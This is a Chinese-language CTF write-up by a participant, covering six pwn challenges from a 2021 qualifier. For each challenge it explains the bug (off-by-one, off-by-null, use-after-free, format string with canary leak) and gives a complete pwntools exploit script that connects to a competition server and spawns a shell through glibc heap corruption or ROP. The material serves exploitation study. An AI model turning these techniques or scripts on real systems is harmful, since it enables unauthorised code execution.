# 第四届”强网“拟态防御国际精英挑战赛初赛Writeup(Pwn部分)

阅读量 **513564**

|评论 **1**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-11-05 15:30:50

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p3.ssl.qhimg.com/t01fd891bdf9fa3a31e.jpg)

## 一、写在前面

第四届“强网”拟态防御国际精英挑战赛初赛于10月25日早9：00圆满结束，本人参加了这次比赛的初赛。在比赛中我负责Pwn部分的题目，比赛结束时一共完成了六道题目。在这里将我的writeup分享给大家。

本次Pwn一共有8道题目，sonic和oldecho本人没有负责解答。

文章对应赛题链接：

链接：https://pan.baidu.com/s/1UA8DQh8OcZ5KCB7vyPeCBg

提取码：7b8d

参考资料：https://github.com/shellphish/how2heap/blob/master/glibc_2.31/house_of_einherjar.c

## 二、write up

### 1、bitflip

程序edit功能中存在offbyone漏洞。程序有一个1638的特殊功能，但可以不进行利用。直接使用offbyone利用方式进行利用即可。

    
    
    from pwn import *
    from time import *
    libc = ELF('/home/wbohan/Desktop/glibc-all-in-one/libs/2.27-3ubuntu1.4_amd64/libc-2.27.so')
    #p=process('./bitflip')
    p=remote('124.71.130.185',49153)
    one_gadget = [0x4f3d5,0x4f432,0x10a41c]
    def alloc(index,size):
    p.recvuntil('choice: ')
    p.sendline('1')
    p.recvuntil('Index: ')
    p.sendline(str(index))
    p.recvuntil('Size: ')
    p.sendline(str(size))
    def edit(index,content):
    p.recvuntil('choice: ')
    p.sendline('2')
    p.recvuntil('Index: ')
    p.sendline(str(index))
    p.recvuntil('Content: ')
    p.send(content)
    def show(index):
    p.recvuntil('choice: ')
    p.sendline('3')
    p.recvuntil('Index: ')
    p.sendline(str(index))
    p.recvuntil('Content: ')
    def free(index):
    p.recvuntil('choice: ')
    p.sendline('4')
    p.recvuntil('Index: ')
    p.sendline(str(index))
    def magic(address):
    p.recvuntil('choice: ')
    p.sendline('1638')
    p.recvuntil('Address: ')
    p.send(str(address))
    alloc(1,0x18)
    
    alloc(3,0x48)
    alloc(4,0x48)
    alloc(5,0x48)
    alloc(6,0x48)
    alloc(7,0x48)
    alloc(8,0x48)
    alloc(9,0x48)
    alloc(10,0x48)
    alloc(11,0x48)
    alloc(12,0x48)
    edit(5,p8(0) * 0x48 +p8(0xa1))
    edit(6,p8(0) * 0x48 +p8(0xa1))
    edit(7,p8(0) * 0x48 +p8(0xa1))
    edit(8,p8(0) * 0x48 +p8(0xa1))
    edit(9,p8(0) * 0x48 +p8(0xa1))
    edit(10,p8(0) * 0x48 +p8(0xa1))
    edit(11,p8(0) * 0x48 +p8(0xa1))
    edit(12,p8(0) * 0x48 +p8(0xa1))
    edit(1,p8(0) * 0x18 + p8(0xa1))
    alloc(13,0x18)
    for i in range(6,13):
    free(i)
    free(3)
    alloc(3,0x48)
    show(4)
    leak_addr = u64(p.recv(6).ljust(8,'\x00'))
    libc_base = leak_addr - 0x7ffb7398cca0 + 0x7ffb735a1000
    malloc_hook = libc_base + libc.sym['__malloc_hook']
    realloc_hook = libc_base + libc.sym['realloc']
    alloc(20,0x48)
    
    free(20)
    edit(4,p64(malloc_hook - 0x10))
    p.sendline('\n')
    alloc(20,0x48)
    alloc(21,0x48)
    edit(21,p64(0) + p64(one_gadget[2] + libc_base) + p64(realloc_hook+6))
    p.sendline('\n')
    log.success(hex(libc_base))
    #gdb.attach(p)
    #pause()
    p.sendline('1')
    p.sendline('30')
    p.sendline('15')
    p.interactive()

### 2、old_school_revenge

本题是old_school的加强版，但是难度并没有增加多少，edit功能中存在漏洞，offbyone变成了offbynull。将tcache填满后再得到unsorted
bin泄露libc地址构造fakechunk到malloc_hook上用onegadget来getshell。

    
    
    from pwn import *
    #p=process('./old_school_revenge')
    p = remote('123.60.63.39',49153)
    libc = ELF('/home/wbohan/Desktop/libc-2.27.so')
    #libc = ELF('/home/wbohan/Desktop/glibc-all-in-one/libs/2.27-3ubuntu1.4_amd64/libc-2.27.so')
    #libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    one_gadget = [0x4f3d5,0x4f432,0x10a41c]
    #p = remote('121.36.194.21',49153)
    def alloc(index,size):
    p.recvuntil('Your choice: ')
    p.sendline('1')
    p.recvuntil('Index')
    p.sendline(str(index))
    p.recvuntil('Size: ')
    p.sendline(str(size))
    def edit(index,content):
    p.recvuntil('Your choice: ')
    p.sendline('2')
    p.recvuntil('Index: ')
    p.sendline(str(index))
    p.recvuntil('Content: ')
    p.sendline(content)
    def show(index):
    p.recvuntil('Your choice: ')
    p.sendline('3')
    p.recvuntil('Index: ')
    p.sendline(str(index))
    p.recvuntil('Content: ')
    def free(index):
    p.recvuntil('Your choice: ')
    p.sendline('4')
    p.recvuntil('Index: ')
    p.sendline(str(index))
    
    alloc(1,0x18)
    alloc(2,0x100)
    alloc(3,0x80)
    alloc(4,0x10)
    edit(2,p8(0) * 0xf0 + p64(0x100))
    for i in range(9,16):#tcache 0x110 full
    alloc(i,0x100)
    for i in range(9,16):
    free(i)
    free(2)
    edit(1,p8(0) * 0x18)
    alloc(2,0x80)
    alloc(5,0x40)
    for i in range(9,16):#tcache 0x90 full
    alloc(i,0x80)
    for i in range(9,16):
    free(i)
    free(2)
    free(3)
    for i in range(9,16):#tcache 0x90 clear
    alloc(i,0x80)
    alloc(2,0x80)
    for i in range(9,16):#tcache 0x90 full
    free(i)
    show(5)
    leak_addr = u64(p.recv(6).ljust(8,'\x00'))
    libc_base = leak_addr - 0x7f2d11a70ca0 + 0x7f2d11685000
    malloc_hook = libc_base + libc.sym['__malloc_hook']
    realloc_hook = libc_base + libc.sym['realloc']
    for i in range(9,16):#tcache 0x110 clear
    alloc(i,0x100)
    alloc(7,0x100)
    free(7)
    edit(5,p64(malloc_hook - 0x10))
    alloc(7,0x100)
    alloc(8,0x100)
    edit(8, p64(0) + p64(one_gadget[2] + libc_base) + p64(realloc_hook + 2))
    free(4)
    #gdb.attach(p)
    #pause()
    alloc(4,0x10)
    p.interactive()

### 3、old_school

offbyone模板题，将tcache填满后再得到unsorted
bin泄露libc地址构造fakechunk到malloc_hook上用onegadget来getshell。

    
    
    from pwn import *
    p=process('./old_school')
    libc = ELF('/home/wbohan/Desktop/libc-2.27.so')
    #libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    one_gadget = [0x4f3d5,0x4f432,0x10a41c]
    p = remote('121.36.194.21',49153)
    def alloc(index,size):
    p.recvuntil('Your choice: ')
    p.sendline('1')
    p.recvuntil('Index')
    p.sendline(str(index))
    p.recvuntil('Size: ')
    p.sendline(str(size))
    def edit(index,content):
    p.recvuntil('Your choice: ')
    p.sendline('2')
    p.recvuntil('Index: ')
    p.sendline(str(index))
    p.recvuntil('Content: ')
    p.sendline(content)
    def show(index):
    p.recvuntil('Your choice: ')
    p.sendline('3')
    p.recvuntil('Index: ')
    p.sendline(str(index))
    p.recvuntil('Content: ')
    def free(index):
    p.recvuntil('Your choice: ')
    p.sendline('4')
    p.recvuntil('Index: ')
    p.sendline(str(index))
    '''
    alloc(10,0x88)
    alloc(11,0x18)
    alloc(12,0x88)
    alloc(13,0x10)
    alloc(14,0x88)
    alloc(15,0x10)
    for i in range(7):
    alloc(i,0xd8)
    for i in range(7):
    free(i)
    for i in range(7):
    alloc(i,0x88)
    for i in range(7):
    free(i)
    
    edit(11,p64(0)*3 + p8(0xe1))
    free(12)
    '''
    alloc(10,0x88)
    alloc(11,0x18)
    alloc(12,0x88)
    alloc(13,0x88)
    edit(11,p64(0) * 3 + p8(0xb1))
    free(12)
    alloc(12,0xa8)
    for i in range(7):
    alloc(i,0x88)
    for i in range(7):
    free(i)
    free(13)
    edit(12,'a' * 0x90)
    show(12)
    p.recvuntil('a' * 0x90)
    leak_addr = u64(p.recv(6).ljust(8,'\x00'))
    libc_base = leak_addr + 0x7f74e30b9000 - 0x00007f74e34a4c0a
    realloc_hook = libc_base + libc.sym['realloc']
    malloc_hook = libc_base + libc.sym['__malloc_hook']
    print(hex(libc_base))
    print(hex(malloc_hook))
    edit(12,'\x00' * 0x88 + p64(0x91))
    for i in range(7):
    alloc(i,0x88)
    edit(6,'aaaa')
    free(13)
    alloc(13,0x88)
    free(13)
    edit(12,'\x00' * 0x88 + p64(0x91) + p64(malloc_hook - 8))
    alloc(14,0x88)
    alloc(15,0x88)
    edit(15,p64(one_gadget[2] + libc_base) + p64(realloc_hook + 2))
    #gdb.attach(p)
    #pause()
    alloc(16,0x10)
    p.interactive()

### 4、random_heap

每次申请的堆块大小都会被随机加入一个0x10 * a的大小。其中a = rand & 0xF。共有16种值。漏洞是uaf。思路：tcache
bin中的堆块其bk会指向tcache结构，可以首先泄露出tcache的地址。然后去使用tcache perthread
corruption的方式控制tcache结构。这就需要利用tcache bin
attack。先申请一个大于等于0x80大小的堆块将它释放到tcache中，然后利用uaf去修改fd指针为tcache的值。再申请两次同样大小的堆块就可以去得到分配到tcache的堆块。虽然我们不知道每个堆块的大小。但我们可以知道tcache中的头部存的是每个tcache
bin中的堆块数目。所以如果一个堆块分配到tcache中了，那么它内部肯定是有数据的，但是其他的堆块中却没有数据（为0）.所以说可以通过一个字节一个字节的填充读入去判断堆块中是否有多余的数据，如果有的话说明成功将堆块分配到了tcache中。得到了一个tcache堆块后，为了之后利用方便，可以把tcache首部全部填充为7，这样就让系统认为所有的tcache都满了，然后在申请一个大小大于0x80的堆块释放就是unsorted
bin，可以直接泄露libc。得到libc后直接修改tcache堆块中的指针域，让指针域指向mallochook-0x10.然后再去分配，malloc_hook中也是有数据的，虽然不知道分配的到的堆块是不是malloc_hook处的堆块，但是可以通过上面分配tcache的方法检测。得到malloc_hook后，填入、调整onegadget就能拿到shell。

    
    
    from pwn import *
    #libc = ELF('/home/wbohan/Desktop/libc-2.27.so')
    libc = ELF('/home/wbohan/Desktop/glibc-all-in-one/libs/2.27-3ubuntu1.4_amd64/libc-2.27.so')
    one_gadget = [0x4f3d5,0x4f432,0x10a41c]
    def alloc(index,size):
    p.recvuntil('choice:')
    p.sendline('1')
    p.recvuntil('Index: ')
    p.sendline(str(index))
    p.recvuntil('Size:')
    p.sendline(str(size))
    
    def edit(index,content):
    p.recvuntil('choice:')
    p.sendline('2')
    p.recvuntil('Index: ')
    p.sendline(str(index))
    p.recvuntil('Content:')
    p.send(content)
    
    def show(index):
    p.recvuntil('choice:')
    p.sendline('3')
    p.recvuntil('Index: ')
    p.sendline(str(index))
    p.recvuntil('Content: ')
    
    def free(index):
    p.recvuntil('choice:')
    p.sendline('4')
    p.recvuntil('Index: ')
    p.sendline(str(index))
    while True:
    try:
    #p = process('./random_heap')
    p = remote('124.71.140.198',49153)
    tmp1 = 0
    size1 = 0
    fakeindex = 0
    fakeindex2 = 0
    nextindex = 0
    alloc(1,0x80)
    alloc(2,0x10)
    free(1)
    edit(1,'a' * 8)
    show(1)
    p.recvuntil('a' * 8)
    tcache_addr = u64(p.recv(6).ljust(8,'\x00'))
    print(hex(tcache_addr))
    edit(1,p64(tcache_addr))
    
    for i in range(10,51):
    flag = False
    alloc(i,0x80)
    for j in range(7,23):
    edit(i,j * 'a')
    show(i)
    tmpstr = p.recvuntil('\n',drop = True)
    if len(tmpstr) != j:
    #the use_size of chunk1 is 0x10 * (j + 1)
    size1 = 0x10 * (j + 1)
    flag = True
    break
    if flag is True:
    fake_index = i
    break
    print(hex(size1))
    print(hex(fake_index))
    edit(fake_index,p8(7) * 0x30)#tcache bin full
    alloc(fake_index+1,0x80)
    alloc(fake_index+2,0x80)#seperate top chunk
    free(fake_index+1)
    show(fake_index+1)
    leak_addr = u64(p.recv(6).ljust(8,'\x00'))
    libc_base = leak_addr - 0x7fe0317a1ca0 + 0x7fe0313b6000
    malloc_hook = libc_base + libc.sym['__malloc_hook']
    realloc_hook = libc_base + libc.sym['realloc']
    gadget = libc_base + one_gadget[2]
    edit(fake_index,'\x00' * 0x80)
    alloc(2,0x40)#flash_unsorted
    alloc(2,0x40)#flash_unsorted
    alloc(2,0x40)#flash_unsorted
    alloc(2,0x40)#flash_unsorted
    alloc(60,0x80)
    free(60)#free fake_index get chunk
    edit(60,p64(malloc_hook-0x10))
    
    for l in range(10,60):
    flag = False
    alloc(l,0x80)
    edit(l,'a' * 0x80)
    show(l)
    tmpstr = (p.recvuntil('\n',drop = True))
    if len(tmpstr) != 0x80:
    edit(l,'\x00' * 0x80)
    fake_index2 = l
    break
    edit(fake_index2,p64(0) + p64(gadget) + p64(realloc_hook + 2))
    log.success(hex(libc_base))
    break
    except:
    p.close()
    continue
    
    #gdb.attach(p)
    #pause()
    alloc(61,0x10)
    p.interactive()

### 5、bornote

本题是一个libc-2.31版本的offbynull利用漏洞。libc-2.31的堆块合并检测比较严格，但是有通用的利用方法，这里可以使用how2heap中的2.31版本house-of-einherjar的利用方式来进行利用。文章起始处我给出了参考链接。我就是使用了这个攻击方法解答此题目的。

    
    
    from pwn import *
    #p=process('./bornote')
    p = remote('121.36.250.162',49153)
    libc = ELF('/home/wbohan/Desktop/glibc-all-in-one/libs/2.31-0ubuntu9.2_amd64/libc-2.31.so')
    #context.log_level = 'debug'
    def alloc(size):
    p.recvuntil('cmd: ')
    p.sendline('1')
    p.recvuntil('Size')
    p.sendline(str(size))
    def edit(index,content):
    p.recvuntil('cmd: ')
    p.sendline('3')
    p.recvuntil('Index: ')
    p.sendline(str(index))
    p.recvuntil('Note: ')
    p.send(content)
    def show(index):
    p.recvuntil('cmd: ')
    p.sendline('4')
    p.recvuntil('Index: ')
    p.sendline(str(index))
    p.recvuntil('Note: ')
    def free(index):
    p.recvuntil('cmd: ')
    p.sendline('2')
    p.recvuntil('Index: ')
    p.sendline(str(index))
    
    p.sendline('wbohan')
    for i in range(0,7):
    alloc(0x88)
    alloc(0x88)#7
    alloc(0x10)#8
    for i in range(0,7):
    free(i)
    free(7)
    alloc(0x18)#0
    show(0)
    leak_addr = u64(p.recv(6).ljust(8,'\x00'))
    alloc(0x68)#1
    free(8)
    free(0)
    alloc(0x18)#0
    show(0)
    heap_addr = u64(p.recv(6).ljust(8,'\x00'))
    libc_base = leak_addr - 0x7fe9992fdc60 + 0x7fe999112000
    malloc_hook = libc_base + libc.sym['__malloc_hook']
    free_hook = libc_base + libc.sym['__free_hook']
    realloc_hook = libc_base + libc.sym['realloc']
    system = libc_base + libc.sym['system']
    environ = libc_base + libc.sym['__environ']
    one_gadget = [0xe6c7e,0xe6c81,0xe6c84]
    free(0)
    free(1)
    alloc(0x38)#0
    alloc(0x28)#1
    alloc(0xf8)#2
    a = 0x20 + heap_addr
    edit(0,p64(0) + p64(0x60) + p64(a) * 2)
    p.sendline('\n')
    edit(1,p64(0) * 4 + p64(0x60) + p8(0))
    p.sendline('\n')
    for i in range(3,10):
    alloc(0xf8)
    for i in range(3,10):
    free(i)
    free(2)
    alloc(0x158)#2
    alloc(0x28)#3
    free(3)
    free(1)
    edit(2,p64(0) * 5 + p64(0x31) + p64(environ))
    p.sendline('\n')
    alloc(0x28)#1
    alloc(0x28)#3
    p.sendline('\n')
    show(3)
    stack_addr = u64(p.recv(6).ljust(8,'\x00'))
    #log.success(hex(libc_base))
    log.success(hex(heap_addr))
    ssss2 = heap_addr + 0x30
    #log.success(hex(stack_addr))
    notelist_addr = stack_addr - 0x7ffe806c4ea8 + 0x7ffe806c4c70
    log.success(hex(notelist_addr))
    alloc(0x28)#4
    alloc(0x28)#1
    free(4)
    free(1)
    edit(2,p64(0) * 5 + p64(0x31) + p64(notelist_addr))
    p.sendline('\n')
    alloc(0x28)#1
    alloc(0x28)#4
    stack_addr2 = notelist_addr - 0x7ffcb55c03c0 + 0x7ffcb55c04e8
    log.success(hex(stack_addr2))
    p.sendline('\n')
    edit(4,p64(0)*2 +p64(stack_addr2) + p16(0x158))
    p.sendline('\n')
    show(1)
    leak_codebase = u64(p.recv(6).ljust(8,'\x00'))
    log.success(hex(leak_codebase))
    
    codebase = leak_codebase - 0x56427bd38f70 + 0x56427bd37000
    #ssss = notelist_addr - 0x7fff3cf79200 + 0x7fff3cf791a8
    
    #edit(2,'/bin/sh\x00')
    #p.sendline('\n')
    log.success(hex(codebase))
    #pop_rdi = 0x1fd3 + codebase
    #ret = 0x101a + codebase
    target_addr = codebase + 0x1c02
    #ssss = notelist_addr + 0x7ffeafcb5170 - 0x7ffeafcb5118 - 0xb0
    #log.success(hex(ssss))
    edit(4,p64(0)*2 +p64(malloc_hook) + p16(0x158))
    p.sendline('\n')
    edit(1,p64(one_gadget[1] + libc_base))
    p.sendline('\n')
    
    '''
    edit(4,p64(0)*2 +p64(ssss) + p16(0x158))
    p.sendline('\n')
    edit(1,p64(ssss2))
    p.sendline('\n')
    edit(4,p64(0)*2 +p64(ssss + 8) + p16(0x158))
    p.sendline('\n')
    edit(1,p64(system))
    p.sendline('\n')
    '''
    
    #gdb.attach(p)
    #pause()
    alloc(0x100)
    
    p.interactive()

### 6、pwnpwn

本题是一个printf格式化字符串漏洞与canary绕过的考察。一共可以利用两次格式化字符串（这个格式化字符串本身也存在着栈溢出）第一次用来泄露canary的值，第二次维护canary的值并构造rop链。程序中本身存在binsh和system。利用起来十分容易。

    
    
    from pwn import *
    from time import *
    libc = ELF('/home/wbohan/Desktop/libc-2.23.so')
    #p=process('./pwnpwn')
    p = remote('124.71.156.217',49153)
    p.recvuntil('something\n')
    p.sendline('1')
    p.recvuntil('trick\n')
    leak_addr = int(p.recvuntil('\n',drop = True),16)
    
    codebase = leak_addr - 0x9b9
    pop_rdi = codebase + 0xb83
    pop_rsi_r15 = codebase + 0xb81
    system_addr = codebase + 0x808
    puts_plt = codebase + 0x7f0
    bin_sh = codebase + 0x202010
    p.sendline('2')
    p.recvuntil('hello')
    offset = 8
    
    payload = 'a' * 105
    p.send(payload)
    p.recvuntil('a' * 105)
    leak_canary = u64(p.recv(7).rjust(8,'\x00'))
    log.success(hex(leak_canary))
    
    payload2 = 'a' * 104 + p64(leak_canary) + p64(0xdeadbeef) + p64(pop_rdi) + p64(bin_sh) + p64(system_addr)
    p.sendline(payload2)
    #log.success(hex(getshell))
    #log.success(hex(leak_addr))
    #log.success(hex(ret_addr))
    
    #gdb.attach(p)
    #pause()
    p.interactive()

## 三、个人总结

本次强网挑战杯是我解题完成度最高的一次比赛了，虽然我并不参加复赛，但不得不说还是非常有成就感的。本次题目中比较有难度的应该是random_heap、oldecho和bornote，剩下的题目基本都是模板题目。非常适合pwn新手参与（比如我），并且在比赛过程中，也与前辈们不断交流学习，学到了许多利用的方法。例如bornote的2.31版本利用方法。总之本次比赛对于我个人而言无论是成就上还是实力上都有着不俗的提升，我也非常建议pwn新手对赛题进行赛后分析。

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **wbohan** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/257132](/post/id/257132)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Pwn](/tag/Pwn)
  * [CTF](/tag/CTF)

 **+1** __3赞

 __收藏

![](https://thirdwx.qlogo.cn/mmopen/vi_32/PiajxSqBRaEL6YIiaTrV3OyorBJ1TsIsHWl1DC3UDKCNK27YgAOe9oOiaMUnEVumibDVH21UK61R5KyOLRSshvzMicg/132)
wbohan

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

